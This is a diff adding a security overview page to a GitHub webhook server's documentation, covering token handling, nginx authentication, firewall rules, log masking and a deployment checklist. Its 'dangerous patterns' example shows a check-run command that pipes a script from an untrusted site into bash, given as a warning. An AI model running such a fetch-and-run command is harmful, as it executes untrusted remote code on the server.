@@ -1,0 +1,471 @@
+---
+title: Security Overview
+description: Comprehensive security architecture and best practices for GitHub Webhook Server
+---
+
+The GitHub Webhook Server implements multiple layers of security to protect your webhook processing infrastructure, GitHub tokens, and sensitive data.
+
+## Security Architecture
+
+The webhook server follows a defense-in-depth approach with multiple security layers:
+
+```
+Internet → GitHub Webhooks → [Webhook Server] ← Internal Network ← Log Viewer Access
+                                    ↓
+                            [Authenticated Endpoints]
+                                    ↓
+                            [Unauthenticated Log Viewer]
+                                    ↑
+                            [Network-Level Protection]
+```
+
+### Core Security Components
+
+1. **Webhook Authentication** - HMAC-SHA256 signature verification
+2. **IP Allowlisting** - Restrict access to GitHub and Cloudflare IP ranges
+3. **Token Security** - Multiple token support with automatic rotation
+4. **Network Isolation** - Deploy critical endpoints behind VPN or reverse proxy
+5. **SSL/TLS** - Encrypted communication with GitHub API
+
+## Token Security Best Practices
+
+### Token Storage
+
+**Never commit tokens to version control.** Use one of these secure methods:
+
+1. **Environment Variables** (Recommended for containers):
+   ```bash
+   # In docker-compose.yaml
+   environment:
+     - WEBHOOK_SECRET=your-webhook-secret
+   ```
+
+2. **External Secret Management**:
+   ```yaml
+   # Kubernetes example
+   valueFrom:
+     secretKeyRef:
+       name: webhook-secret
+       key: secret
+   ```
+
+3. **Configuration File** (secure file permissions):
+   ```yaml
+   # config.yaml - ensure 0600 permissions
+   github-tokens:
+     - ghp_your_github_token
+   webhook-secret: "your-secure-secret" # pragma: allowlist secret
+   ```
+
+### Token Permissions
+
+Use **fine-grained personal access tokens** when possible:
+
+- **Repository permissions:**
+  - `Contents`: Read & Write
+  - `Issues`: Read & Write
+  - `Pull requests`: Read & Write
+  - `Checks`: Read & Write
+  - `Metadata`: Read
+  - `Administration`: Read & Write (for branch protection)
+
+- **Organization permissions:**
+  - `Members`: Read (for OWNERS validation)
+
+### Token Rotation Strategy
+
+Implement automatic failover with multiple tokens:
+
+```yaml
+# Global token configuration
+github-tokens:
+  - ghp_token_1
+  - ghp_token_2
+  - ghp_token_3
+
+repositories:
+  my-project:
+    # Override with repository-specific tokens
+    github-tokens:
+      - ghp_repo_specific_token
+```
+
+**Benefits:**
+- Automatic failover when rate limits are reached
+- Zero downtime during token rotation
+- Distribute API quota across multiple tokens
+
+### Token Monitoring
+
+Monitor token usage in structured logs:
+
+```json
+{
+  "token_spend": 3,
+  "rate_limit_remaining": 4997
+}
+```
+
+Set up alerts when rate limits are low:
+
+```bash
+# Alert when rate limit drops below 1000
+jq 'select(.rate_limit_remaining < 1000)' logs/webhooks_*.json
+```
+
+## SSL/TLS Configuration
+
+### Production Settings
+
+```yaml
+# config.yaml
+disable-ssl-warnings: true  # Reduce log noise in production
+```
+
+**TLS best practices:**
+- Deploy behind reverse proxy with TLS termination
+- Use valid SSL certificates (Let's Encrypt, commercial CA)
+- Enable HSTS headers in reverse proxy
+- Disable TLS 1.0/1.1, enforce TLS 1.2+
+
+### Development Settings
+
+```yaml
+# config.yaml
+disable-ssl-warnings: false  # Keep SSL warnings in development
+```
+
+## Network-Level Security
+
+### Reverse Proxy with Authentication
+
+**nginx example with HTTP Basic Auth:**
+
+```nginx
+# /etc/nginx/sites-available/webhook-server
+server {
+    listen 443 ssl http2;
+    server_name webhook.example.com;
+
+    ssl_certificate /etc/letsencrypt/live/webhook.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/webhook.example.com/privkey.pem;
+
+    # Webhook endpoint - public access (GitHub webhooks)
+    location /webhook_server {
+        proxy_pass http://localhost:5000;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+
+    # Log viewer - requires authentication
+    location /logs {
+        auth_basic "Webhook Logs";
+        auth_basic_user_file /etc/nginx/.htpasswd;
+        proxy_pass http://localhost:5000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";  # WebSocket support
+    }
+
+    # MCP endpoints - requires authentication
+    location /mcp {
+        auth_basic "MCP API";
+        auth_basic_user_file /etc/nginx/.htpasswd;
+        proxy_pass http://localhost:5000;
+    }
+}
+```
+
+Create password file:
+
+```bash
+sudo htpasswd -c /etc/nginx/.htpasswd admin
+```
+
+### Firewall Rules
+
+Restrict access to webhook server port:
+
+```bash
+# iptables example - allow only GitHub IP ranges
+sudo iptables -A INPUT -p tcp --dport 5000 -s 192.30.252.0/22 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 5000 -s 185.199.108.0/22 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 5000 -s 140.82.112.0/20 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 5000 -j DROP
+```
+
+**Cloudflare Zero Trust:**
+
+```bash
+# cloudflared tunnel example
+cloudflared tunnel --url http://localhost:5000
+```
+
+### VPN Access
+
+**Deploy log viewer endpoints only on VPN:**
+
+1. **WireGuard VPN** - Modern, secure VPN solution
+2. **OpenVPN** - Traditional VPN with broad compatibility
+3. **Tailscale** - Zero-config mesh VPN
+
+### Network Segmentation
+
+Isolate webhook server in dedicated network segment:
+
+```
+┌─────────────────────────────────────┐
+│   DMZ - Public-Facing Services      │
+│   ┌─────────────────────────────┐   │
+│   │  Reverse Proxy (nginx)      │   │
+│   │  - TLS termination          │   │
+│   │  - Rate limiting            │   │
+│   └─────────────┬───────────────┘   │
+└─────────────────┼───────────────────┘
+                  │
+┌─────────────────┼───────────────────┐
+│   Internal Network                  │
+│   ┌─────────────┴───────────────┐   │
+│   │  Webhook Server             │   │
+│   │  - Process webhooks         │   │
+│   │  - Log viewer (internal)    │   │
+│   └─────────────────────────────┘   │
+└─────────────────────────────────────┘
+```
+
+## Sensitive Data Protection
+
+### Log Masking
+
+**Always enable in production:**
+
+```yaml
+# config.yaml - Global setting
+mask-sensitive-data: true  # Default: true
+
+# Repository-specific override (NOT recommended in production)
+repositories:
+  my-repository:
+    mask-sensitive-data: false  # Only for debugging
+```
+
+**What gets masked:**
+- GitHub personal access tokens (`ghp_*`, `github_pat_*`)
+- Webhook secrets
+- Container registry passwords
+- PyPI tokens
+- API keys in environment variables
+
+### Custom Check Runs Security
+
+<Warning>
+  The `custom-check-runs` feature executes user-defined commands on the server during PR events. This is a powerful capability that requires careful security consideration.
+</Warning>
+
+**Risks:**
+- Commands run with the webhook server's system permissions
+- Commands execute in the cloned repository worktree
+- Malicious or misconfigured commands could compromise server security
+- Environment variables in commands may expose sensitive data in logs
+
+**Security Recommendations:**
+
+1. **Review all commands carefully** - Only configure commands from trusted sources
+2. **Principle of least privilege** - Run the webhook server with minimal required permissions
+3. **Audit configurations** - Regularly review `custom-check-runs` in configuration files
+4. **Restrict configuration access** - Limit who can modify `config.yaml` and `.github-webhook-server.yaml`
+5. **Monitor execution logs** - Watch for unexpected command behavior or failures
+6. **Avoid sensitive data in commands** - Do not embed secrets directly in command strings
+
+**Secure configuration example:**
+
+```yaml
+custom-check-runs:
+  - name: lint
+    command: uv tool run --from ruff ruff check  # Uses trusted, pinned tool
+    mandatory: true
+  - name: type-check
+    command: uv run mypy .  # Runs in isolated environment
+    mandatory: false
+```
+
+**Dangerous patterns to avoid:**
+
+```yaml
+# ❌ DANGEROUS: Never do this
+custom-check-runs:
+  - name: risky-check
+    command: curl https://untrusted-site.com/script.sh | bash  # Never pipe to shell
+  - name: secret-exposure
+    command: API_KEY=secret123 some-command  # Secrets visible in logs
+```
+
+## Security Best Practices
+
+### 1. Log Viewer Access Control
+
+<Warning>
+  The log viewer endpoints (`/logs/*`) and MCP endpoints (`/mcp/*`) are **NOT PROTECTED** by authentication. They expose potentially sensitive webhook data and should **NEVER** be exposed outside your local network or trusted environment.
+</Warning>
+
+**Required security measures:**
+- ✅ Deploy behind reverse proxy with authentication
+- ✅ Use firewall rules to restrict access to trusted IP ranges only
+- ✅ Never expose log viewer ports directly to the internet
+- ✅ Monitor access to log endpoints in infrastructure logs
+- ✅ Consider VPN-only access for maximum security
+
+**Data exposure risk:**
+Log files may contain:
+- GitHub personal access tokens
+- User information and webhook payloads
+- Repository details and sensitive data
+- Internal system information
+
+### 2. Container Security
+
+Run as non-privileged user when possible:
+
+```yaml
+# docker-compose.yaml
+services:
+  github-webhook-server:
+    image: ghcr.io/myk-org/github-webhook-server:latest
+    user: "1000:1000"  # Non-root user
+    # privileged: true only if building containers
+```
+
+### 3. Secrets Management
+
+Use external secret management systems:
+
+- **HashiCorp Vault** - Enterprise secret management
+- **AWS Secrets Manager** - Cloud-native secrets
+- **Kubernetes Secrets** - Container orchestration secrets
+- **GitHub Secrets** - For GitHub Actions integration
+
+### 4. Comprehensive Logging
+
+Enable detailed logging for security monitoring:
+
+```yaml
+log-level: INFO  # Set to DEBUG only for troubleshooting
+log-file: webhook-server.log
+mcp-log-file: mcp_server.log
+logs-server-log-file: logs_server.log
+```
+
+### 5. Regular Updates
+
+Keep webhook server updated:
+
+```bash
+# Pull latest stable release
+podman pull ghcr.io/myk-org/github-webhook-server:latest
+
+# Check for updates
+podman images | grep github-webhook-server
+```
+
+### 6. Security Monitoring
+
+Monitor for security events:
+
+```bash
+# Failed webhook signatures
+grep "signatures didn't match" webhook-server.log
+
+# Unauthorized IP access attempts
+grep "IP not in allowlist" webhook-server.log
+
+# Rate limit abuse
+grep "rate limit exceeded" webhook-server.log
+```
+
+## Environment Variables
+
+Security-related environment variables:
+
+| Variable | Description | Default | Security Impact |
+|----------|-------------|---------|----------------|
+| `WEBHOOK_SECRET` | GitHub webhook secret | - | **HIGH** - Required for signature verification |
+| `VERIFY_GITHUB_IPS` | Verify GitHub IP addresses | `false` | **HIGH** - Enable for production |
+| `VERIFY_CLOUDFLARE_IPS` | Verify Cloudflare IP addresses | `false` | **MEDIUM** - Enable if using Cloudflare |
+| `ENABLE_LOG_SERVER` | Enable log viewer endpoints | `false` | **CRITICAL** - Never enable on public networks |
+| `ENABLE_MCP_SERVER` | Enable MCP server endpoints | `false` | **CRITICAL** - Never enable on public networks |
+
+## Compliance and Auditing
+
+### Audit Trail
+
+Structured webhook logs provide complete audit trail:
+
+```json
+{
+  "hook_id": "abc123-def456",
+  "event_type": "pull_request",
+  "sender": "username",
+  "repository": "org/repo",
+  "started_at": "2025-01-30T10:30:00.123456",
+  "success": true,
+  "workflow_steps": [...]
+}
+```
+
+### Data Retention
+
+Implement log rotation and retention policies:
+
+```bash
+# logrotate configuration
+/path/to/webhook-server.log {
+    daily
+    rotate 90
+    compress
+    delaycompress
+    notifempty
+    create 0640 webhook webhook
+}
+```
+
+### Compliance Frameworks
+
+**SOC 2 Considerations:**
+- Access control (reverse proxy authentication)
+- Audit logging (structured webhook logs)
+- Data encryption (TLS/SSL)
+- Incident response (monitoring and alerting)
+
+**GDPR Considerations:**
+- Data minimization (configure only necessary webhooks)
+- Right to erasure (log retention policies)
+- Data security (encryption, access control)
+
+## Security Checklist
+
+Before deploying to production:
+
+- [ ] Enable webhook signature verification (`WEBHOOK_SECRET`)
+- [ ] Enable IP allowlist verification (`VERIFY_GITHUB_IPS=true`)
+- [ ] Enable sensitive data masking (`mask-sensitive-data: true`)
+- [ ] Deploy log viewer behind authentication (nginx, VPN)
+- [ ] Configure TLS/SSL with valid certificates
+- [ ] Implement firewall rules for webhook server
+- [ ] Use external secret management for tokens
+- [ ] Enable comprehensive logging (`log-level: INFO`)
+- [ ] Set up monitoring and alerting
+- [ ] Implement log rotation and retention
+- [ ] Review custom check runs security
+- [ ] Test disaster recovery procedures
+- [ ] Document security procedures
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Webhook Verification" icon="shield-check" href="/security/webhook-verification">
+    Learn about IP allowlisting and HMAC signature verification
+  </Card>
+  <Card title="Log Viewer Security" icon="eye-slash" href="/security/log-viewer-security">
+    Secure the unauthenticated log viewer endpoints
+  </Card>
+</CardGroup>
